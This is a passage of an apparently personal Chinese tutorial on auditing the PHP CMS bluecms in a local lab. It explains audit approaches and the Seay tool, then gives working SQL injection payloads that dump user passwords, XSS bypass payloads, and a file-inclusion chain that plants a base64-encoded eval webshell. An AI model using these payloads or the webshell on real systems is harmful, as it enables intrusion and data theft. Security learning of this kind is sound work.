<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="a8c813ee6cf8dd6debfcc02612225dad">代码审计</h1>
<h2 data-content="1" id="b477d6178cc182e90468dadfb63cd9c6">概念</h2>
<p>什么是代码审计？<br/>
代码审计是在一个编程中对源代码旨在发现错误、安全漏洞或违反编程约定的项目。<br/>
说人话就是找它这些代码中可能存在问题的地方，然后看它是否真的存在漏洞。(博主小白，可能存在问题，请见谅)</p>
<h2 data-content="1" id="c870240c68b5810af69874ba007ca196">分类</h2>
<p>代码审计的话大致分为三种，白盒、黑盒和灰盒</p>
<h3 data-content="1" id="b03301735ff69703e3c2e78c00f68541">白盒测试</h3>
<p>较为官方的定义</p>
<div class="highlight"><pre><span></span><span class="x">已知产品的内部工作过程，可以进行测试证明每种内部操作是否符合设计规格要求，所有内部成分是否经过检查。</span>
</pre></div>
<p>其实这种测试的话就是你可以看到源代码，直接从代码中来看哪里可能出现问题，然后进行检测，此时你是知道内部结构的，测试相对黑盒测试会比较容易一点<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756957.png"/></p>
<h3 data-content="1" id="d70dc95a5223e6a938533445a8f81a9a">黑盒测试</h3>
<p>较为官方的定义</p>
<div class="highlight"><pre><span></span><span class="x">已知产品的功能设计规格，可以进行测试证明每个实现了的功能是否符合要求。</span>
</pre></div>
<p>其实黑盒测试的话就是你只知道网页的大致结构，然后对各个功能开始检测，按自己的思路进行测试，比如看到留言界面，测试XSS，看到登录界面，测试SQL注入这种</p>
<h3 data-content="1" id="fe86346d4dff20c4b8d18e3b86a58d6e">灰盒测试</h3>
<p>灰盒测试是介于白盒测试与黑盒测试之间，自己测试的同时结合代码来看。<br/>
一般代码审计的话都是类似于这种灰盒测试的。</p>
<h1 data-content="1" id="6a02b4bd020dfd0525042e77a7bb4d99">如何代码审计</h1>
<h2 data-content="1" id="38fee77c0f8ce0a3a8a911d950c7bca7">了解CMS结构</h2>
<p>每个CMS都拥有数以百计的文件，这个时候我们该如何审，从哪里审呢，这个时候就要关注重要点，以这里的bluecms为例<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756998.png"/><br/>
这里有多个文件及文件夹，该从何入手呢，首先就从文件夹的名字入手，因为程序员在开发时一般不会随意起名，对应的文件夹名一般都是有作用的，例如这里的<code>install</code>就是安装目录，具体分类大致如下</p>
<blockquote>
<p>├── admin     后台管理目录<br/>
├── install   网站的安装目录<br/>
├── api       接口文件目录<br/>
├── data     系统处理数据相关目录<br/>
├── include  用来包含的全局文件<br/>
└── template  模板</p>
</blockquote>
<p>同时它还有<br/>
(1)函数集文件，它的定义如下</p>
<p>这类文件通常命名中包含functions或者common等关键字，这些文件里面是一些公共的函数，提供给其他文件统一调用，所以大多数文件都会在文件头部包含到它们，寻找这些文件一个非常好用的技巧就是去打开index.php或者一些功能性文件，在头部一般都能找到。</p>
<p>(2)配置文件，它的定义如下</p>
<p>这类文件通常命名里面包括config这个关键字，配置文件包括Web程序运行必须的功能性配置选项以及数据库等配置信息，从这个文件里面可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数值是用单引号还是用的双引号包起来，如果是双引号，则很大可能会存在代码执行漏洞。</p>
<h2 data-content="1" id="1aa4b9ee77f0fb47607647e197e57fc8">寻找关键词</h2>
<p>大致的分类的话就如下所示</p>
<div class="highlight"><pre><span></span><span class="n">命令执行</span>    <span class="n">system</span><span class="err">、</span><span class="n">shell_exec</span><span class="err">、</span><span class="n">passthru</span><span class="err">、</span><span class="n">popen</span><span class="err">、</span><span class="n">proc_open</span>
<span class="n">文件包含</span>    <span class="n">require</span><span class="err">、</span><span class="n">include</span><span class="err">、</span><span class="n">require_once</span><span class="err">、</span><span class="n">include_once</span>
<span class="n">变量覆盖</span>    <span class="n">parse_str</span> <span class="err">、</span><span class="n">mb_parse_str</span>
<span class="n">代码执行</span>    <span class="n">eval</span><span class="err">、</span><span class="k">assert</span><span class="err">、</span><span class="n">preg_replace</span>
<span class="n">文件操作</span>    <span class="n">file_get_contents</span> <span class="err">、</span><span class="n">file_put_contents</span> <span class="err">、</span><span class="n">move_uploaded_file</span> <span class="err">、</span><span class="n">unlink</span> <span class="o">&amp;</span> <span class="n">delete</span>
</pre></div>
<p>这些是大致的关注点，但是如果自己去找的话一般这么多的文件，一个个ctrl+f寻找关键词也是比较慢的，因此一般的话是借用工具的，但工具不是百分百灵验的，我们需要结合自己的判断来看它是否真的存在漏洞，一会介绍一下工具，现在先具体的介绍一下这些关注点</p>
<h3 data-content="1" id="1dfd44b39352be84d8227a7af32badae">SQL注入关键词</h3>
<p>SQL注入，关注点就是<code>SELECT xxx From xxx WHERE xxx</code>以及<code>UPDATE xxx SET xxx WHERE xxx</code>这些字词，当出现这些的时候，才有可能出现SQL注入。<br/>
同时还要关注<code>character_set_connect='gbk'</code>这种语句，出现它时可能会出现宽字节注入。</p>
<p>例如</p>
<div class="highlight"><pre><span></span><span class="x">$ad = $db-&gt;getone("SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id);</span>
<span class="x">$db-&gt;query("UPDATE ".table('article')." SET comment = comment+1 WHERE id = ".$id);</span>
</pre></div>
<h3 data-content="1" id="3c49fd08d3a4b1daca3180756fb38c99">XSS关键词</h3>
<p>XSS常见地是留言板，新闻编辑处这些可以写入内容的地方，同时我们可以结合之前存在的漏洞进行尝试XSS。</p>
<h3 data-content="1" id="70b5e9b6ec81e5dc7b5621674ef5ce06">任意文件删除关键词</h3>
<p>这类在修改头像、修改内容时可能比较常见，然后一般我们就可以去这类文件下看它是否有<code>unlink</code>函数，如果有的话就可能存在任意文件删除漏洞</p>
<h2 data-content="1" id="b6e45d3b223b6f74c8a41537bed3c4fc">工具</h2>
<p>我们一般自己去找的话有点慢，效率不高，但代码审计有应用可以帮助我们进行代码审计，常见的是Seay源代码审计系统，seay工具链接如下<br/>
<a href="https://github.com/f1tz/cnseay" target="_blank">https://github.com/f1tz/cnseay</a><br/>
我们关注的SQL注入，我们就可以去搜索SELECT<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756384.png"/><br/>
以及<code>UPDATE</code><br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756308.png"/><br/>
对应的任意文件删除漏洞，我们就去搜索<code>unlink</code>函数<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756133.png"/><br/>
这个时候就可以直接定位到利用函数的语句中，相比自己找要快捷很多，同时Seay代码审计具有自动代码审计的功能，用它也是蛮方便的。<br/>
下面开始审计</p>
<h1 data-content="1" id="b847de83aed8bb58f75513c3e7a10b5d">bluecms</h1>
<h2 data-content="1" id="18c00c0bac5238d8d30006e370090267">环境配置</h2>
<p>这个CMS是比较简单的一个，源码链接如下<br/>
<a href="https://github.com/source-trace/bluecms" target="_blank">https://github.com/source-trace/bluecms</a><br/>
我的环境配置是<code>phpstudy 2018 5.5.38+mysql5.5.53</code>，不要用7+这种高版本的php，因为这个cms是比较老的，它的部分函数与新版本php两者是不相匹配的，然后搭建好后访问<code>bluecms-master/install/</code>，这个时候可能界面是空白，我们需要开启一下<code>允许目录列表</code><br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756218.png"/><br/>
然后去删除<code>bluecms-master\install\compile</code>下的php文件<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756296.png"/><br/>
此时再去重新访问<code>install</code><br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756479.png"/><br/>
按照步骤配置即可，但是到<code>step=5</code>时又变成空白了，不过这个时候已经搭建好了，访问<code>bluecms-master/index.php</code>就可以发现已经配置成功<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756587.png"/></p>
<h2 data-content="1" id="8b5644119207115f56ed412ed2d7ddf2">工具扫描</h2>
<p>使用seay工具进行扫描<br/>
扫描这个cms后得到很多数据<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756675.png"/><br/>
开始挨个进行分析</p>
<h2 data-content="1" id="6260ae51f496fbacc7f38cf3f892524c">SQL注入</h2>
<h3 data-content="1" id="770516fc5f00a5dfee090c9f8b713958">ad_js.php</h3>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756688.png"/><br/>
跟进第一条<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756710.png"/><br/>
包含了<code>common.inc.php</code>文件，跟进查看这个文件<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756817.png"/><br/>
if语句中有一个<code>get_magic_quotes_gpc</code>函数，查看这个<code>get_magic_quotes_gpc</code>函数<br/>
<img src="https://img-blog.csdnimg.cn/e2af9ef0b61241c7b1591c380f0ba1b2.png"/><br/>
<img src="https://img-blog.csdnimg.cn/57f00423a077409088f31f2ec29599dd.png"/><br/>
这么看的话其实就是相当于if语句中始终为1，那也就是说它对<code>GET POST COOKIES REQUEST</code>这些请求的参数加上了<code>deep_addslashes</code>函数，此时跟进这个函数进行查看<br/>
<img src="https://img-blog.csdnimg.cn/bc39413cab0f4880902915914c4b4565.png"/><br/>
可以发现这里其实就是加上了<code>addslashes</code>函数，而这个函数呢是对<code>单引号、双引号、反斜线</code>加上<code>\</code>进行转义的，因此这里其实就是限制了<code>单引号、双引号、反斜线</code>的使用，防止SQL注入</p>
<p>再回到最开始，发现注入参数是<code>ad_id</code>，观察代码可以看出它对<code>ad_id</code>参数先进行了<code>trim()</code>过滤，也就是过滤了参数中的空白字符，例如<code>空格 \t \r \n</code>这些，之后呢进行了SQL注入查询语句，参数两边是没有加单引号的，看起来是可以进行SQL注入的，此时发现<code>getone</code>函数，我们跟进这个函数进行查看<br/>
<img src="https://img-blog.csdnimg.cn/a3f4931614ff40cfa67961ac8bab2e83.png"/><br/>
<img src="https://img-blog.csdnimg.cn/01bf9f80fd034fe8a02a98c50211edc9.png"/><br/>
<img src="https://img-blog.csdnimg.cn/738c87413e584abaaf7f9e0f3d21568a.png"/><br/>
从这里看出它这个函数是将结果取出的，因此这里的话我们总结一下，它就是一个SQL查询语句，我们可以控制where ad_id=<code>xxx</code>这一部分，同时它有这个<code>单引号</code>过滤函数，但是这里变量是没有被单引号包裹的，所以这里这个函数其实是无效的，而且这个结果有回显，会返回结果，我们此时就可以尝试在此界面进行SQL注入<br/>
访问<code>bluecms-master/ad_js.php</code>,先看一下字段数</p>
<div class="highlight"><pre><span></span><span class="n">ad_id</span><span class="o">=-</span><span class="mi">1</span> <span class="n">order</span> <span class="n">by</span> <span class="mi">7</span>
<span class="n">ad_id</span><span class="o">=-</span><span class="mi">1</span> <span class="n">order</span> <span class="n">by</span> <span class="mi">8</span>
</pre></div>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755442.png"/><br/>
当是7的时候无回显，为8的时候报错，说明字段数为7，接下来尝试联合查询</p>
<div class="highlight"><pre><span></span><span class="o">-</span><span class="mi">1</span> <span class="n">union</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span>
</pre></div>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755322.png"/><br/>
看起来是无回显的，但当我们去查看源代码时就会发现是有回显的，不过加了注释<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755438.png"/><br/>
因此这里的这个7就是回显位，接下来开始注入即可</p>
<div class="highlight"><pre><span></span><span class="o">//</span><span class="err">查库</span>
<span class="o">-</span><span class="mi">1</span> <span class="n">union</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="n">database</span><span class="p">()</span>
<span class="o">//</span><span class="err">查表</span>
<span class="o">-</span><span class="mi">1</span> <span class="n">union</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,(</span><span class="n">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span>  <span class="kn">from</span> <span class="nn">infromation_schema.tables</span> <span class="nn">where</span> <span class="nn">table_schema</span><span class="o">=</span><span class="n">database</span><span class="p">()</span>
</pre></div>
<p>当然这里这个查表也可以用十六进制来进行绕过<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755142.png"/><br/>
我这里的数据库名是<code>root</code>，对其进行十六进制加密后为<code>726f6f74</code>，加上<code>0x</code>使得能够被识别为十六进制数，构造payload如下</p>
<div class="highlight"><pre><span></span><span class="o">//</span><span class="err">查表</span>
<span class="n">ad_id</span><span class="o">=-</span><span class="mi">1</span> <span class="n">union</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,(</span><span class="n">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span>  <span class="kn">from</span> <span class="nn">information_schema.tables</span> <span class="nn">where</span> <span class="nn">table_schema</span><span class="o">=</span><span class="mh">0x726f6f74</span><span class="p">)</span>
<span class="o">//</span><span class="err">查列</span><span class="p">(</span><span class="err">以</span><span class="n">blue_user为例</span><span class="p">)</span>
<span class="n">ad_id</span><span class="o">=-</span><span class="mi">1</span> <span class="n">union</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,(</span><span class="n">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="n">column_name</span><span class="p">)</span>  <span class="kn">from</span> <span class="nn">information_schema.columns</span> <span class="nn">where</span> <span class="nn">table_name</span><span class="o">=</span><span class="mh">0x626c75655f75736572</span><span class="p">)</span>
<span class="o">//</span><span class="err">查字段</span>
<span class="n">ad_id</span><span class="o">=-</span><span class="mi">1</span> <span class="n">union</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,(</span><span class="n">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span><span class="mh">0x7e</span><span class="p">,</span><span class="n">user_name</span><span class="p">,</span><span class="mh">0x7e</span><span class="p">,</span><span class="n">pwd</span><span class="p">)</span>  <span class="kn">from</span> <span class="nn">blue_user</span><span class="p">)</span>
</pre></div>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755064.png"/></p>
<h3 data-content="1" id="03ee2fa4ba796d648f03faf72810ac20">ann.php（失败）</h3>
<p>只看这个<code>SELECT</code>语句的话，确实是没有什么过滤的，看起来可以进行SQL注入<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755102.png"/><br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755647.png"/><br/>
但是看最上面的传值处就会发现<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755804.png"/><br/>
这两个在有值时，结果是<code>intval</code>函数包含后的，我们测试一下这个函数</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$a</span><span class="o">=</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'a'</span><span class="p">];</span>
<span class="k">echo</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755961.png"/><br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755113.png"/><br/>
可以发现字母都被pass了，因此这里的话，就没办法进行SQL注入了<br/>
G，下一个。</p>
<h3 data-content="1" id="8e2b5e2913f088c23446da3d32db5c8b">comment.php（失败）</h3>
<p>打开发现这个<code>SELECT</code>语句中<code>id</code>变量是无单引号包裹的<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755211.png"/><br/>
id如果没有被过滤的话，就存在可注入点，看id传值处<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755312.png"/><br/>
id添加了<code>intval</code>函数，因此这个参数是无法进行注入了，此时这个type也同理，限制了值只能是<code>0或1</code>，这个<code>act</code>的话<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755443.png"/><br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755671.png"/><br/>
限制了只能为<code>list</code>或者<code>send</code>，而且它不在查询语句这种里面，在这个文件里没有用到，因此也是可以判定为没戏的，所以这个文件也G</p>
<h3 data-content="1" id="4077e6d252246b5e54e7ff50a1b76689">user.php(失败)</h3>
<p>按照seay审计系统的来，发现这个有select语句，但是它的变量都是有单引号包裹的<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755891.png"/><br/>
在最上方看看包含的文件<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755928.png"/><br/>
发现包含有这个<code>common.inc.php</code>文件，而这个文件中有过滤单引号的函数，因此这里不存在SQL注入。</p>
<p>下一处<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755986.png"/><br/>
这里的id变量未被单引号包裹，但它在传值时添加了<code>intval</code>函数，这意味着字符串无法上传，因此这个也是无法成功注入的。PASS</p>
<h2 data-content="1" id="19db37e7875753ced40495a145053d36">XSS</h2>
<h3 data-content="1" id="a39f89d8f0b21b1b17cf7c9379f572dd">ad_js.php</h3>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755010.png"/><br/>
这个<code>ad_id</code>变量可控，而且它没有单引号包裹，那不就意味着我们可以随意构造后面的语句，不仅仅是SQL注入，XSS应该也是可以的，我们构造payload如下</p>
<div class="highlight"><pre><span></span><span class="x">1 &lt;script&gt;alert(/quan9i/)&lt;/script&gt;</span>
</pre></div>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755067.png"/></p>
<h3 data-content="1" id="225b3d9a530727b0ad18c53486693e4a">user.php</h3>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755137.png"/></p>
<div class="highlight"><pre><span></span><span class="x">elseif ($act == 'do_add_news') {</span>
<span class="x">    include_once 'include/upload.class.php';</span>
<span class="x">    $image = new upload();</span>
<span class="x">    $title = !empty($_POST['title']) ? htmlspecialchars(trim($_POST['title'])) : '';</span>
<span class="x">    $color = !empty($_POST['color']) ? htmlspecialchars(trim($_POST['color'])) : '';</span>
<span class="x">    $cid = !empty($_POST['cid']) ? intval($_POST['cid']) : '';</span>
<span class="x">    if(empty($cid)){</span>
<span class="x">        showmsg('���ŷ��಻��Ϊ��');</span>
<span class="x">    }</span>
<span class="x">    $author = !empty($_POST['author']) ? htmlspecialchars(trim($_POST['author'])) : $_SESSION['admin_name'];</span>
<span class="x">    $source = !empty($_POST['source']) ? htmlspecialchars(trim($_POST['source'])) : '';</span>
<span class="x">    $content = !empty($_POST['content']) ? filter_data($_POST['content']) : '';</span>
<span class="x">    $descript = !empty($_POST['descript']) ? mb_substr($_POST['descript'], 0, 90) : mb_substr(html2text($_POST['content']),0, 90);</span>
<span class="x">    if(isset($_FILES['lit_pic']['error']) &amp;&amp; $_FILES['lit_pic']['error'] == 0){</span>
<span class="x">        $lit_pic = $image-&gt;img_upload($_FILES['lit_pic'],'lit_pic');</span>
</pre></div>
<p>这里发现title和color添加了转换HTML实体函数，因此是可以确定是不存在XSS的，下面亦是如此，但我们发现包含content的函数是不同的，它是<code>filter_data</code>函数包裹的，跟进这个函数看看<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755321.png"/></p>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755396.png"/><br/>
函数如下</p>
<div class="highlight"><pre><span></span><span class="n">function</span> <span class="nf">filter_data</span><span class="o">(</span><span class="n">$str</span><span class="o">)</span>
<span class="o">{</span>
    <span class="n">$str</span> <span class="o">=</span> <span class="n">preg_replace</span><span class="o">(</span><span class="s">"/&lt;(\/?)(script|i?frame|meta|link)(\s*)[^&lt;]*&gt;/"</span><span class="o">,</span> <span class="s">""</span><span class="o">,</span> <span class="n">$str</span><span class="o">);</span>
    <span class="k">return</span> <span class="n">$str</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>发现过滤了常用的xss标签，但仍存在其他的xss标签，如</p>
<div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="mi">1</span> <span class="n">onerror</span><span class="o">=</span><span class="n">alert</span><span class="o">(</span><span class="mi">1</span><span class="o">)&gt;</span>
<span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="n">javascript</span><span class="o">:</span><span class="n">alert</span><span class="o">(</span><span class="mi">1</span><span class="o">)&gt;&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">svg</span> <span class="n">onload</span><span class="o">=</span><span class="n">alert</span><span class="o">(</span><span class="mi">1</span><span class="o">)&gt;</span>
<span class="o">&lt;</span><span class="n">button</span> <span class="n">onclick</span><span class="o">=</span><span class="n">alert</span><span class="o">(</span><span class="mi">1</span><span class="o">)&gt;</span>
</pre></div>
<p>此时这个应该是有可能的，我们看后面他还有没有过滤<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755445.png"/><br/>
可以发现这个SQL语句直接将这个content给写进去了，那这里就应该是存在XSS的，我们尝试构造一下<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755517.png"/><br/>
这里加*的应该是必选项，那我们就只写这几个即可，构造payload如下<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755531.png"/><br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755660.png"/><br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755737.png"/><br/>
点击编辑<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755802.png"/><br/>
成功触发XSS</p>
<h3 data-content="1" id="093b008b7782abfbee1142b7ff9e8117">guest_book.php</h3>
<p>在看前台的时候发现有一个留言的界面，点击访问，url跳转到了<code>guest_book.php</code>下，查看源码<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141755903.png"/><br/>
可以发现这个里面的内容加上了HTML实体标签，因此内容实现XSS是没戏，而且在开头可以发现包含了一个文件<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756009.png"/><br/>
这个文件里面对单引号进行了转义，这里的话还剩一个变量是<code>page_id</code>，可以发现这个参数是没有被单引号或者双引号包裹的，然后我们看一下包含它的<code>showmsg</code>函数<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756073.png"/><br/>
也并未对这个id进行过滤，说明这里可能有戏，我们先正常上传一个123试试<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756130.png"/><br/>
上传后没有异常，查看界面源代码<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756234.png"/><br/>
找到我们的page_id变量，这里就可以发现是被input标签中value属性包含的，如果我们可以摆脱这个，那么就可以实现xss，那这个时候我们闭合双引号，先写一个<code>"</code>，再闭合标签，用<code>&gt;</code>，而后加上我们的xss语句<code>&lt;scipt&gt;alert(1)&lt;/script&gt;</code>即可，此时我们想到开头不是有一个转义双引号的吗，但是我们看一下这里此时的语句</p>
<div class="highlight"><pre><span></span><span class="n">value</span><span class="o">=</span><span class="s">"\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;"</span>
</pre></div>
<p>这个\正好被当做了value的值，双引号还是起到作用了，此时我们来传值进行尝试<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756298.png"/><br/>
成功XSS</p>
<h2 data-content="1" id="643e98efd7442c54e25985d92c1c6201">文件包含</h2>
<h3 data-content="1" id="dafcfd986075d4de9f2bceda4728c07d">user.php</h3>
<p>seay审计代码系统扫描中发现一个文件包含漏洞<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756425.png"/></p>
<p>跟进进行查看<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756464.png"/><br/>
发现这里在上过pay之后直接进行了包含，如果版本号低的话，应该是可以利用%00截断</p>
<blockquote>
<p>%00截断<br/>
magic_quotes_gpc=off，PHP小于5.3.4</p>
</blockquote>
<p>还有路径长度截断</p>
<blockquote>
<p>路径长度截断<br/>
Linux 需要文件名长于 4096，Windows 需要长于 256</p>
</blockquote>
<p>但在这里测试%00截断行不通，尝试路径长度截断可行<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756531.png"/><br/>
这里的php文件是本地的，那我们该如何去上传一个文件来getshell呢<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756575.png"/><br/>
发现user下有一个上传头像的，如果这个文件名可控的话，那么就可以getshell了<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756783.png"/><br/>
发现此时给出了文件名<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756839.png"/><br/>
包含一下同时传值进行尝试<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756885.png"/><br/>
成功，还有一种方式，因为这里的话是include一个文件，我们知道include文件的话，就会执行这个文件里的语句，那我们就可以让他包含一个文件，然后这个文件里写入我们的小木马即可，示例如下<br/>
这个是1.php</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">include</span><span class="p">(</span><span class="s2">"qq.php"</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>然后这个是qq.php</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="o">@</span><span class="nb">fputs</span><span class="p">(</span><span class="nb">fopen</span><span class="p">(</span><span class="s1">'shell.php'</span><span class="p">,</span><span class="s1">'w'</span><span class="p">),</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s1">'PD9waHAgQGV2YWwoJF9QT1NUWzFdKT8+'</span><span class="p">));</span><span class="cp">?&gt;</span><span class="x"></span>
<span class="x">//PD9waHAgQGV2YWwoJF9QT1NUWzFdKT8+为</span><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>然后我们去访问1.php<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756909.png"/><br/>
此时再看这个文件夹下<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756070.png"/><br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756236.png"/><br/>
成功写入，原理就是这样。此时我们再来看这里，我们传入的方式的话就是上传头像，我们将我们php文件改为jpg而后上传，内容依旧是写入shell.php，其内容为一句话木马</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="o">@</span><span class="nb">fputs</span><span class="p">(</span><span class="nb">fopen</span><span class="p">(</span><span class="s1">'shell.php'</span><span class="p">,</span><span class="s1">'w'</span><span class="p">),</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s1">'PD9waHAgQGV2YWwoJF9QT1NUWzFdKT8+'</span><span class="p">));</span><span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756283.png"/><br/>
此时还需要进行一下文件包含，我们去查看一下当前的头像路径<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756386.png"/><br/>
此时去包含它，用刚刚路径长度截断的姿势即可<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756411.png"/><br/>
此时去查看shell.php，如果界面空白则应该是上传成功<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756471.png"/><br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756529.png"/><br/>
蚁剑连接<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756646.png"/></p>
<h2 data-content="1" id="66ebe2c97abde5331f46473e77883d13">任意文件删除</h2>
<p>这种的话一般是找<code>unlink</code>函数，这个函数是删除文件的，可能存在任意文件删除漏洞，这里的话我门用seay代码审计工具来进行查看<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756808.png"/><br/>
跟进user.php查看</p>
<h3 data-content="1" id="e068041198f959da3f420a57ac6c955a">user.php</h3>
<h4 data-content="1" id="1bf52c0c2ee2baf895758f2c2c235036">id参数(失败)</h4>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756894.png"/><br/>
